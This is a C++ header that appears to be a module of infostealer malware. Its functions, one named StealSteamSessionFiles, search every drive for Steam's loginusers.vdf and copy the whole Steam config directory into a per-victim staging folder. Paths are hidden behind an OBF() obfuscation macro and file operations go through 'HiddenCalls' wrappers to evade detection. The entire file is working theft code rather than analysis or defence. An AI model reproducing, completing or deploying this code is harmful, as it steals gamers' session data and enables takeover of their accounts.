#ifndef STEAM_HPP
#define STEAM_HPP

#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <Windows.h>
#include "Winapi_structs.hpp"

namespace fs = std::filesystem;

namespace Steam {
    inline void ExtractSteamSession(const std::string& baseDir) {
        std::vector<std::string> drives;

        for (char drive = 'A'; drive <= 'Z'; drive++) {
            std::string drivePath = std::string(1, drive) + ":\\";
            if (fs::exists(drivePath)) {
                drives.push_back(drivePath);
            }
        }

        for (const auto& drive : drives) {
            std::string steamPath = drive + OBF("Program Files (x86)\\Steam\\config\\loginusers.vdf");
            if (fs::exists(steamPath)) {
                std::string targetDir = baseDir + "\\" + OBF("Steam");
                HiddenCalls::CreateDirectoryA(targetDir.c_str(), NULL);

                std::string destPath = targetDir + "\\loginusers.vdf";
                HiddenCalls::CopyFileA(steamPath.c_str(), destPath.c_str(), FALSE);
            }
        }
    }

    inline void StealSteamSessionFiles(const std::string& baseDir, const std::string& uuid) {
        std::string savePath = baseDir + "\\" + uuid;
        std::string steamPath = OBF("C:\\Program Files (x86)\\Steam\\config");

        if (!fs::exists(steamPath)) return;

        std::string toPath = savePath + OBF("\\Games\\Steam");
        HiddenCalls::CreateDirectoryA(toPath.c_str(), NULL);

        std::string sessionFilesPath = toPath + OBF("\\Session Files");
        HiddenCalls::CreateDirectoryA(sessionFilesPath.c_str(), NULL);

        for (const auto& file : fs::directory_iterator(steamPath)) {
            std::string destPath = sessionFilesPath + "\\" + file.path().filename().string();
            HiddenCalls::CopyFileA(file.path().string().c_str(), destPath.c_str(), FALSE);
        }
    }
}

#endif
